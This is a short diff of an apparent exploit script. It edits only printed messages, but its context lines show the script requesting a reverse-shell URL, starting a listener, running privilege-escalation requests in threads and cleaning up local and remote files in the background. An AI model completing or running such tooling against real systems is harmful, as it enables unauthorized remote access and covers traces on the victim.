@@ -265,7 +265,7 @@ if __name__=='__main__':
                         if cleanup_path is not None:
                             cleanup_paths.append(cleanup_path)
                     if timed_out:
-                        print(f'\nStarting a listener on port {args.lport}, Please wait... this might take a few seconds.\nCleanup of all the locally created and remotely created files created in this process will be done in the background\n')
+                        print(f'\nStarting a listener on port {args.lport}, Please wait... this might take a few seconds.\nCleanup of all the locally created and remotely created files in this process will be done in the background\n')
                         t2 = threading.Thread(target=exploit, args=(priv_esc_url,))
                         t2.daemon = True
                         t2.start()
@@ -288,7 +288,7 @@ if __name__=='__main__':
                     req = requests.get(rev_shell_url, verify=False)
                     print(f'\nTrying to get a reverse shell with this url: {rev_shell_url}')
                     print(f'\n\nIf {args.shell_type} payload does not work, please consider using another payload from the available list.\n')
-                    print(f'\nStarting a listener on port {args.lport}, Please wait... this might take a few seconds.\nCleanup of all temporary files created in this process will be done in the background\n')
+                    print(f'\nStarting a listener on port {args.lport}, Please wait... this might take a few seconds.\nCleanup of all the locally created and remotely created files in this process will be done in the background\n')
                     t2 = threading.Thread(target=exploit, args=(rev_shell_url,))
                     t2.daemon = True
                     t2.start()
